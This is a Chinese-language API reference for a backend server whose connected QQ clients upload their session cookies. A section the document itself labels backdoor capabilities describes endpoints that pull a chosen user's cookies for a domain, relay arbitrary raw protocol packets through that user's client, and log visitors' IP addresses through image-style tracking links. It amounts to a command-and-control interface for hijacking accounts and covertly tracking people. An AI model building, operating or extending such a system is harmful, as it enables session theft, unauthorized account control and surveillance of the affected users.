# AWA Backend 接口文档

## 1. 服务信息

- HTTP 服务：`http://<host>:6155`
- WebSocket：`ws://<host>:6155/ws`
- 数据格式：
    - HTTP：`application/json`（部分接口返回纯文本）
    - WebSocket：JSON 字符串

## 2. 鉴权说明

本项目存在两类 Token：

1. **管理员 Token（固定）**
    - 字段：`token`
    - 值来源：`config.awa_token`
    - 用于高权限接口（如远程请求客户端包、获取 Cookie、推送用户、设置云预设）

2. **客户端 Token（动态）**
    - 客户端通过 WebSocket `start_client` / `heartbeat` 成功后由服务端下发
    - 数据库存储并由 `getClientByToken(token)` 校验
    - 用于普通受控接口（如 appid 查询、在线用户、qlogo、qqsy 等）

---

## 3. HTTP 接口

### 3.1 首页与静态资源

#### `GET /`

- 说明：返回首页 HTML。
- 鉴权：无。
- 响应：`index.html`。

#### `GET /logo.png`

- 说明：返回 Logo 图片。
- 鉴权：无。
- 响应：PNG 二进制。

---

### 3.2 IP 记录相关

#### `GET /coins_query/`

- 说明：测试接口。
- 鉴权：无。
- 响应示例：

```text
∞
```

#### `GET /s/:filename.png`

- 说明：记录访问者 IP 到 `data.json`（按 `filename` 聚合），存在则去重追加，不存在则新建记录。
- 鉴权：无。
- 路径参数：
    - `filename`：记录 ID。
- 响应示例：

```text
1
```

#### `POST /get/:filename.txt`

- 说明：读取 `data.json` 中对应 `filename` 的 IP 记录。
- 鉴权：无。
- 路径参数：
    - `filename`：记录 ID。
- 响应：
    - 命中：返回文本（多行 IP）。
    - 未命中：`无`。

---

### 3.3 在线用户与推送

#### `GET /online_users`

- 说明：获取在线客户端 UIN 列表。
- 鉴权：客户端 Token。
- Query 参数：
    - `token`：客户端 Token。
- 成功响应示例：

```json
{
	"count": 2,
	"users": [123456, 234567]
}
```

- 失败：
    - `403 Forbidden`
    - `500 无法获取在线用户`

#### `GET /push_user`

- 说明：触发一次数据库用户在线/离线状态推送到群。
- 鉴权：管理员 Token。
- Query 参数：
    - `token`：管理员 Token。
- 成功响应示例：

```json
{}
```

- 失败：
    - `403 Forbidden`
    - `500 无法PushUser`

---

### 3.4 云预设

#### `GET /cloud_preset/get`

- 说明：读取云预设 UUID（文件 `cloud_preset_uuid.txt`）。
- 鉴权：客户端 Token。
- Query 参数：
    - `token`：客户端 Token。
- 成功响应示例：

```json
{ "uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" }
```

- 失败：`403 Forbidden`

#### `GET /cloud_preset/set`

- 说明：设置云预设 UUID。
- 鉴权：管理员 Token。
- Query 参数：
    - `token`：管理员 Token
    - `uuid`：目标 UUID
- 成功响应：

```text
设置成功
```

- 失败响应：

```text
Forbidden
```

或

```text
参数错误
```

---

### 3.5 Bot / 后门能力

#### `POST /bot_send_text`

- 说明：上报客户端文本行为（主要用于告警与审计）。
- 鉴权：无显式 Token 校验（建议仅内网调用）。
- 请求体示例：

```json
{
	"uin": 123456789,
	"data": {
		"text": "验证成功并登录"
	}
}
```

- 成功响应示例：

```json
{}
```

#### `POST /get_cookie`

- 说明：向指定在线客户端发起 Cookie 获取请求，等待客户端回包后返回。
- 鉴权：管理员 Token。
- 请求体参数：
    - `token`：管理员 Token
    - `uin`：目标客户端 UIN
    - `domain`：Cookie 域名
- 请求体示例：

```json
{
	"token": "NACHO...",
	"uin": 123456789,
	"domain": "qun.qq.com"
}
```

- 成功响应：客户端返回的 Cookie 结果（透传）。
- 失败响应：
    - `参数错误`
    - `token 错误`
    - 超时抛错（约 5 秒）

#### `POST /request_raw_packet`

- 说明：向指定在线客户端下发原始包请求并等待结果。
- 鉴权：管理员 Token。
- 编码约定：`packet_body` 需先将 **JSON 包体字符串化后再进行 Base64 编码** 再上传。
- 请求体参数：
    - `token`：管理员 Token
    - `uin`：目标客户端 UIN
    - `packet_name`：包名
    - `packet_body`：包体（Base64 字符串）
- 编码示例：

```js
const bodyObj = { 1: 3413, 2: 0, 4: { 1: 123456 } };
const packetBodyBase64 = Buffer.from(JSON.stringify(bodyObj), "utf-8").toString(
	"base64",
);
```

- 请求体示例：

```json
{
	"token": "NACHO...",
	"uin": 123456789,
	"packet_name": "OidbSvc.xxx",
	"packet_body": "eyIxIjozNDEzfQ=="
}
```

- 成功响应：客户端回传的 `result`（服务端透传，通常为 Base64 字符串或客户端约定格式）。
- 失败响应：
    - `参数错误`
    - `token 错误`
    - 超时抛错（约 5 秒）
- 备注：该脚本注册了 CORS 中间件（`app.use(cors())`）。

#### `POST /qqsy`

- 说明：QQ Ark 相关处理接口，服务端会解析/重签并返回结果。
- 鉴权：客户端 Token。
- 请求体参数：
    - `token`：客户端 Token
    - `ark`：字符串化 JSON
- 成功响应示例：

```json
{ "code": 200, "data": "{...ark json...}" }
```

- 失败响应示例：

```json
{ "code": 500, "msg": "ark json null" }
```

或

```json
{ "msg": "Invalid token" }
```

---

### 3.6 AppID 相关

#### `GET /appid/add`

- 说明：添加 AppID 预设并进行一次协议校验。
- 鉴权：无显式 Token 校验（但会群内告警）。
- Query 参数：
    - `name`
    - `appid`
    - `pkg_name`
    - `pkg_sign`
- 成功响应：`添加成功`
- 失败响应：`参数错误` / `已存在` / `验证失败`

#### `GET /appid/new_get`

- 说明：分页读取 `appid.json`（每页 8 条）。
- 鉴权：客户端 Token。
- Query 参数：
    - `token`：客户端 Token
    - `page`：页码（默认 `1`）
- 成功响应：数组。
- 失败：`403 Forbidden`

#### `GET /appid/info`

- 说明：按 `appid` 查询应用信息（含包名、签名、名称）。
- 鉴权：客户端 Token。
- Query 参数：
    - `token`：客户端 Token
    - `appid`：应用 ID
- 成功响应示例：

```json
{
	"appPkgName": "com.example.app",
	"appPkgSign": "abcd1234",
	"appName": "示例应用"
}
```

- 失败：`403 Forbidden`

#### `GET /appid/search`

- 说明：按名称模糊检索 `appid.json`。
- 鉴权：客户端 Token。
- Query 参数：
    - `token`：客户端 Token
    - `query`：关键字
- 成功响应：数组。
- 失败：`403 Forbidden`

---

### 3.7 其他

#### `GET /get_subid`

- 说明：获取 SubID 版本映射（`linux/macos/windows/mobile_old/mobile/tim/watch`）。
- 鉴权：客户端 Token。
- Query 参数：
    - `token`：客户端 Token
- 成功响应示例：

```json
{
	"linux": { "9.9.0": "xxxx" },
	"macos": {},
	"windows": {},
	"mobile_old": {},
	"mobile": {},
	"tim": {},
	"watch": {}
}
```

- 失败：

```json
{ "msg": "403" }
```

#### `GET /qlogo`

- 说明：抓取图片并上传到群公告图床，返回 `p.qlogo.cn` 链接。
- 鉴权：客户端 Token。
- Query 参数：
    - `token`：客户端 Token
    - `url`：原图 URL
- 成功响应示例：

```json
{
	"code": 200,
	"msg": "success",
	"url": "https://p.qlogo.cn/gdynamic/<imageId>/0"
}
```

- 失败响应示例：

```json
{ "msg": "Unauthorized" }
```

或

```json
{ "code": 500, "msg": "Announce上传失败: 无法获取图片ID" }
```

---

## 4. WebSocket 协议（`/ws`）

### 4.1 连接与绑定

- 客户端连接地址：`/ws`
- 首次消息中若包含 `uin`，服务端会将当前连接绑定到该 `uin`。

### 4.2 客户端 -> 服务端常用消息

#### `type: "start_client"`

- 作用：客户端启动登录。
- 请求数据示例：

```json
{
	"type": "start_client",
	"uin": "123456789",
	"data": {
		"cookie": "...",
		"bkn": "..."
	}
}
```

- 成功回包：

```json
{
	"type": "start_client",
	"data": { "token": "<client-token>" }
}
```

#### `type: "heartbeat"`

- 作用：心跳续期并刷新客户端 Token。
- 请求数据示例：

```json
{
	"type": "heartbeat",
	"uin": "123456789",
	"data": {
		"cookie": "...",
		"bkn": "..."
	}
}
```

- 成功回包：

```json
{
	"type": "heartbeat",
	"data": { "token": "<client-token>" }
}
```

#### `type: "irc_message"`

- 作用：聊天室广播。
- 需要携带有效客户端 Token。
- 服务端广播格式：

```json
{
	"type": "irc_broadcast",
	"data": {
		"from": "<uin>",
		"text": "消息内容",
		"time": 1710000000000
	}
}
```

#### `type: "call_cookie"`

- 作用：响应 `/get_cookie` 的异步请求。
- 数据字段：`data.requestId`、`data.result`。

#### `type: "call_raw_packet"`

- 作用：响应 `/request_raw_packet` 的异步请求。
- 数据字段：`data.requestId`、`data.result`。

### 4.3 服务端 -> 客户端下发消息

#### `type: "get_cookie"`

```json
{
	"type": "get_cookie",
	"data": {
		"requestId": "uuid",
		"domain": "qun.qq.com"
	}
}
```

#### `type: "request_raw_packet"`

```json
{
	"type": "request_raw_packet",
	"data": {
		"requestId": "uuid",
		"packet_name": "OidbSvc.xxx",
		"packet_body": "eyIxIjozNDEzfQ=="
	}
}
```

---

## 5. 错误码与约定

- 常见 HTTP 状态码：
    - `200`：请求成功（部分业务失败也会返回 200 + 文本/JSON）
    - `403`：鉴权失败
    - `500`：服务异常
- 该项目历史接口返回风格不完全统一（有 JSON、纯文本、字符串错误），调用方需按接口逐一兼容。

## 6. 调用建议

1. 优先走 WebSocket `start_client` 获取客户端 Token，再访问需要客户端 Token 的 HTTP 接口。
2. 管理员 Token 仅用于受信环境（建议通过网关/IP 白名单隔离）。
3. `/get_cookie` 与 `/request_raw_packet` 依赖目标客户端在线并及时回包，超时默认约 5 秒。
